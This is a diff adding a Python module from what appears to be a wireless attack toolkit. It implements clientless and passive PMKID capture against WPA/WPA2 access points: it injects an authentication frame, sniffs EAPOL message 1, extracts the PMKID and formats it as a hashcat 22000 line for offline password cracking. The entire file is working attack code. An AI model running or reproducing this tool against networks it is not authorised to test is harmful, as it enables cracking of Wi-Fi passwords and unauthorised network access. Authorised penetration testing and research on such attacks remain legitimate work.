@@ -1,0 +1,180 @@
+"""Clientless PMKID attack: authenticate to the AP and capture EAPOL message 1."""
+
+from __future__ import annotations
+
+import time
+
+from scapy.sendrecv import AsyncSniffer, sendp
+
+from ..frames import craft_auth, is_eapol
+from ..radio import ensure_channel
+
+RSN_PMKID_SUITE = 16  # element ID inside the RSN KDE carrying the PMKID
+
+
+def extract_pmkid(eapol_raw: bytes) -> bytes | None:
+    """Pull the 16-byte PMKID from the RSN KDE of an EAPOL M1 frame, or None."""
+    # WPA key data layout: ...key_data_len(2) at offset 95..97 of the key frame,
+    # but in practice scan for the KDE: dd ?? 00 0f ac 04 <pmkid16>
+    marker = b"\xdd"
+    idx = 0
+    while True:
+        idx = eapol_raw.find(marker, idx)
+        if idx < 0 or idx + 2 >= len(eapol_raw):
+            return None
+        length = eapol_raw[idx + 1]
+        kde = eapol_raw[idx + 2 : idx + 2 + length]
+        if len(kde) >= 20 and kde[:4] == b"\x00\x0f\xac\x04":
+            return kde[4:20]
+        idx += 2
+
+
+def to_22000(pmkid: bytes, bssid: str, client: str, essid: str | None = None) -> str:
+    """Format a PMKID as a hashcat/John 22000 line: PMKID*AP*CLIENT[*ESSID]."""
+    mac_ap = bssid.replace(":", "")
+    mac_cl = client.replace(":", "")
+    line = f"{pmkid.hex()}*{mac_ap}*{mac_cl}"
+    if essid:
+        line += f"*{essid.encode().hex()}"
+    return line
+
+
+def capture_pmkid_passive(
+    iface: str,
+    bssid: str,
+    channel: int | None = None,
+    essid: str | None = None,
+    timeout: float = 10.0,
+    stop_event=None,
+    progress_fn=None,
+) -> str | None:
+    """Passively capture an AP-sourced EAPOL M1 carrying a PMKID.
+
+    Unlike :func:`capture_pmkid`, this never sends an authentication frame.
+    It is intended for the dual-radio PINCER split where the ACHM/mt76x0u
+    listener must remain receive-only while the AWUS1900/rtw88_8814au radio
+    performs all injection. The observed station address becomes the 22000
+    client field, rather than an invented attack-station MAC.
+    """
+    log = progress_fn or (lambda msg: None)
+    # Do not retune the listener here. PINCER has already parked this
+    # interface on the target channel, and a second background ensure_channel()
+    # can race the handshake sniffer on the same radio.
+    found: list[str] = []
+    bssid_lower = bssid.lower()
+
+    def handler(pkt) -> None:
+        if not pkt.addr2 or pkt.addr2.lower() != bssid_lower or not is_eapol(pkt):
+            return
+        from ..frames import eapol_key_info
+
+        info = eapol_key_info(pkt)
+        if info is None or info[0] or not info[1]:  # M1: ACK set, MIC clear
+            return
+        client = pkt.addr1
+        if not client:
+            return
+        pmkid = extract_pmkid(bytes(pkt))
+        if pmkid:
+            found.append(to_22000(pmkid, bssid, client, essid))
+
+    log(f"passively sniffing for EAPOL M1 (up to {timeout:.0f}s)...")
+    sniffer = AsyncSniffer(iface=iface, prn=handler, stop_filter=lambda p: bool(found), store=False)
+    sniffer.start()
+    deadline = time.monotonic() + timeout
+    stopped = False
+    while time.monotonic() < deadline and not found:
+        if stop_event is not None and stop_event.is_set():
+            stopped = True
+            break
+        if not sniffer.thread or not sniffer.thread.is_alive():
+            break
+        time.sleep(0.2)
+    try:
+        sniffer.stop()
+    except Exception:  # noqa: BLE001, S110 - stop can race with thread teardown
+        pass
+    if found:
+        log("PMKID found passively in EAPOL M1")
+    elif stopped:
+        log("passive PMKID capture stopped")
+    else:
+        log("no passive PMKID seen (timeout)")
+    return found[0] if found else None
+
+
+def capture_pmkid(
+    iface: str,
+    bssid: str,
+    client: str,
+    channel: int | None = None,
+    essid: str | None = None,
+    timeout: float = 10.0,
+    stop_event=None,
+    progress_fn=None,
+) -> str | None:
+    """Send an auth frame and sniff EAPOL M1; return a 22000 line or None.
+
+    Uses AsyncSniffer + a poll loop (not blocking sniff()) so stop_event
+    can actually abort mid-capture instead of always running the full
+    timeout — previously this was the one attack with zero Stop Attack
+    responsiveness at all.
+
+    `essid` should always be passed by callers that know it (all current
+    ones do): PMK = PBKDF2(password, ESSID), so a 22000 PMKID line
+    WITHOUT the ESSID field is uncrackable by john/hashcat -- the
+    cracker literally cannot derive the PMK without it.
+
+    The sniffer is started BEFORE the auth frame is sent: a fast AP
+    answers with EAPOL M1 within milliseconds, and the previous
+    send-then-sniff order could miss it entirely.
+    """
+    log = progress_fn or (lambda msg: None)
+    if ensure_channel(iface, channel):
+        log(f"channel set to {channel}")
+    found: list[str] = []
+    bssid_lower = bssid.lower()
+
+    def handler(pkt) -> None:
+        # Only trust EAPOL genuinely sourced from the target AP -- any
+        # other AP's M1 on-channel would otherwise get its PMKID written
+        # under THIS bssid, producing a wrong-hash 22000 line.
+        if not pkt.addr2 or pkt.addr2.lower() != bssid_lower:
+            return
+        if not is_eapol(pkt):
+            return
+        from ..frames import eapol_key_info
+
+        info = eapol_key_info(pkt)
+        if info is None or info[0] or not info[1]:  # want M1: ack set, mic not set
+            return
+        pmkid = extract_pmkid(bytes(pkt))
+        if pmkid:
+            found.append(to_22000(pmkid, bssid, client, essid))
+
+    log(f"sniffing for EAPOL M1 (up to {timeout:.0f}s)...")
+    sniffer = AsyncSniffer(iface=iface, prn=handler, stop_filter=lambda p: bool(found), store=False)
+    sniffer.start()
+    time.sleep(0.05)  # let the sniffer's socket go live before provoking the AP
+    log(f"sending auth frame to {bssid} (from {client})")
+    sendp(craft_auth(bssid=bssid, client=client), iface=iface, verbose=False)
+    deadline = time.monotonic() + timeout
+    stopped = False
+    while time.monotonic() < deadline and not found:
+        if stop_event is not None and stop_event.is_set():
+            stopped = True
+            break
+        if not sniffer.thread or not sniffer.thread.is_alive():
+            break
+        time.sleep(0.2)
+    try:
+        sniffer.stop()
+    except Exception:  # noqa: BLE001, S110 - stop can race with thread teardown
+        pass
+    if found:
+        log("PMKID found in EAPOL M1")
+    elif stopped:
+        log("PMKID capture stopped")
+    else:
+        log("no PMKID seen (timeout)")
+    return found[0] if found else None
